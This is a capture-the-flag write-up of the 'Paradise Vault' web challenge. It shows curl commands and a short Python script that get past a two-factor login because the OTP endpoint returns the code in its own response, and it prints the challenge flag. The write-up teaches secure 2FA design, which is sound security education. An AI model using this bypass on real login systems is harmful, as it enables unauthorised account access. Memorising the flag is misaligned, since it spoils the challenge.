# Paradise Vault — web, easy — 1000 pts

**Flag:** `HTB{l34k1ng_0Tp_1nt0_Cl13n7s1d3_1s_b4d_1021ec1f05e01d319656195b97d28473}`

A vault behind username/password plus a one-time-password second factor. Black-box.

---

## Step 1 — the first factor is not the gate

```console
$ curl -s -i -X POST http://$HOST:$PORT/api/login \
       -H 'Content-Type: application/json' \
       -d '{"username":"admin","password":"admin"}'
HTTP/1.1 200 OK
Set-Cookie: session=eyJhbGciOi...
```

Stage 1 accepts essentially anything and issues a JWT `session` cookie. The OTP is the real control,
which is the correct design — so the bug has to be in the OTP flow.

## Step 2 — the OTP endpoint returns the OTP

```console
$ curl -s -b 'session=<jwt>' http://$HOST:$PORT/api/otp/request
{"otp":892315}
```

The endpoint whose job is to *deliver the OTP out of band* instead **returns it in the HTTP response
body to the unauthenticated-second-factor client**. There is nothing to brute force.

## Step 3 — verify

```console
$ curl -s -b 'session=<jwt>' -X POST http://$HOST:$PORT/api/otp/verify \
       -H 'Content-Type: application/json' -d '{"otp":892315}'
{"status":"success","flag":"HTB{l34k1ng_0Tp_1nt0_Cl13n7s1d3_1s_b4d_1021ec1f05e01d319656195b97d28473}"}
```

### Gotcha

**The OTP rotates on every `/api/otp/request` call.** If you request it in one shell and verify in
another, the code you hold is already stale and you will get a failure that looks like the attack
not working. Chain request → verify inside a single script, reusing the same session cookie:

```python
import requests
s = requests.Session()
s.post(f'{BASE}/api/login', json={'username':'admin','password':'admin'})
otp = s.get(f'{BASE}/api/otp/request').json()['otp']
print(s.post(f'{BASE}/api/otp/verify', json={'otp': otp}).json())
```

---

## Lessons

- **A second factor must travel over a second channel.** An OTP returned in the same HTTP response
  as the request that generated it authenticates nothing — it is a very expensive no-op.
- When a two-stage login lets *any* credentials through stage 1, that is a deliberate signal that
  stage 2 holds the bug. Don't burn time brute-forcing stage 1.
- Short-lived, rotating values need to be fetched and used in one process. A stale-value failure is
  easy to misread as "the technique doesn't work here".
